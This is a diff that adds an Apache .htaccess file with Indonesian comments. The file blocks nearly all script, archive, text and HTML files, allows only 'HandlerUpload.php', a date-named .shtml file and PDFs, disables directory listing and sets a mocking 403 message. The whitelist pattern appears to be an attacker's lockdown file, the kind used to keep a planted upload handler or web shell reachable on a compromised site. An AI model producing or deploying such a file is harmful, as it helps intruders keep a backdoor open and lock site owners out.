@@ -1,0 +1,24 @@
+# MATIKAN SEMUA FILE YANG MENCURIGAKAN
+<FilesMatch ".*\.(php|php\d*|phtml|phar|cgi|pl|py|pyc|pyo|exe|jsp|asp|aspx|sh|bash|zip|rar|tar|gz|txt|html|htm|doc|docx|xls|xlsx|js|jsp|rb|jar|class|bin|bat)$">
+  Order allow,deny
+  Deny from all
+</FilesMatch>
+
+# CUMA IZINKAN FILE SPESIFIK INI
+<FilesMatch "^(HandlerUpload\.php|dok_fs_16_20250717_348\.shtml)$">
+  Order allow,deny
+  Allow from all
+</FilesMatch>
+
+# IZINKAN FILE .PDF
+<FilesMatch "\.pdf$">
+  Order allow,deny
+  Allow from all
+</FilesMatch>
+
+# MATIKAN INDEXING DIRECTORY
+Options -Indexes
+
+# CUSTOM ERROR 403 TANPA GAMBAR
+ErrorDocument 403 "Access Forbidden. You ain't getting in, bro."
+
